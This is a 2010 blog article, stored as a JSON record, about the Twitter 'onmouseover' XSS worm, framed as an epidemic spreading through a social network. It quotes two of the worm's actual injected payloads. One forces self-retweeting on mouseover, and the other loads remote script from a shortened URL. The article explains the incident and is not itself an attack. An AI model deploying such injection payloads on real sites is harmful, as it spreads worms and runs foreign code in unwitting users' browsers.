{
  "content": "The exploit was fairly simple, but remarkably effective. Somebody found a bug in the Twitter.com website that allowed them to insert simple bits of JavaScript \u2013 a programming language that lets people add interactivity to web pages \u2013 into messages or Tweets sent on the service. The code was able to detect when the user's mouse passed over the tweet, and trigger a retweet. By hijacking user input in this way, the Twitter hack code was able to replicate itself. And so a new artificial life form of tenuous sorts was born. In computer parlance this little piece of self-replicating code would be called a \"worm\", but in biological terms it's more akin to viruses, little lumps of genetic code in protein coats that rely on hosts to assist their reproduction. Likewise, the artificial equivalent hid the offending code (the \"onmouseover\" section highlighted in bold below) inside a nondescript coating designed to pass through Twitter's validation processes undetected, in this case a link to a website. One of the first versions of the code looked like this: http://a.no/@\" onmouseover=\";$('textarea:first').val(this.innerHTML);$('.status-update-form').submit() \" style=\"color:#000;background:#000;/ You can see the effect of this in the picture below, above a passionate defence of lentils, which both @gimpyblog and I agree are very tasty indeed. Moving the mouse over the curious black box triggers a retweet: Real viruses evolve, and this Twitter worm was little different, with the code changing as the hours passed and the epidemic spread \u2013 albeit with the help of intelligent hands rather than simple mutation. New variants appeared, exploring ways to increase the virulence of the code, making it more disruptive and contagious. These more successful versions worked on the basis that the greater the area of the user's screen affected by the virus, the more likely they were to move the mouse over it and trigger its payload. Early variants found a way to produce very large text: http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\\u002f\\u002fis.gd\\u002ffl9A7')\"/ And eventually breeds appeared that were able to cover the whole page, making it almost impossible for users of the Twitter website to avoid activating the code. So thanks to unwitting users, the rogue code was able to spread, and it did so rapidly, through what biologists would call \"horizontal transmission\" (moving from peer-to-peer as opposed to parent-to-child or \"vertical\" transmission). This graph of an early \"t.co\" variant shows what percentage of Twitter traffic was affected over time, which should be roughly proportional to the number of infected users: Interestingly, there are two peaks: a little bump at around 10.30am, and then a much larger mountain over lunch (British time). I would assume that there's much more traffic on Twitter over lunch, when workers are using the site on their breaks, but the structure of social networks may explain it as well. The worm might have appeared in a slightly isolated cluster of users to begin with, taking a while to break out into the wider world. In the real world, the spread of a virus often remains local when the rate of infection remains below some critical value \u2013 if it can't infect new people at a great enough rate, it risks burning out before it can spread to new areas. On Twitter, the spread of the worm to a highly connected person or people may have been enough to tip infection rates over that threshold and allow it to break out into the wider world. It may not be a coincidence that around the time the second peak was building Sarah Brown was infected, retweeting the bug to her 1.1m followers like a virtual Typhoid Mary. As the epidemic became a global pandemic, its geographical spread highlighted the links between Britain and the rest of the world. To begin with, the outbreak was focused on London: But it spread globally, particularly in English-speaking nations like Australia and the United States, who came late to an epidemic which started well before most Americans turned their computers on in the morning. What's amazing about this outbreak is the speed and quality of data available. In Twitter we have a well defined network of people and a record of every single tweet sent. For those seeking to understand how infectious diseases spread through networks of people \u2013 either in the real or virtual worlds \u2013 this sort of data is invaluable, and it would be brilliant if Twitter could be persuaded to release some of it to researchers. As someone who's dabbled with epidemiological models in the past I'd love to have a play with their data, so I've contacted them on the off-chance, and if I get anything back I'll return to the subject.",
  "title": "Twitter hack: The spread of an artificial life form | Martin Robbins",
  "lead": "An irritating but harmless Twitter hack provides a remarkable example of a pandemic in action",
  "tags": [
    "science/science",
    "technology/technology",
    "technology/hacking",
    "technology/twitter"
  ],
  "core-words": null,
  "id": "science/the-lay-scientist/2010/sep/21/twitter-hack-worm",
  "class": null,
  "words": null
}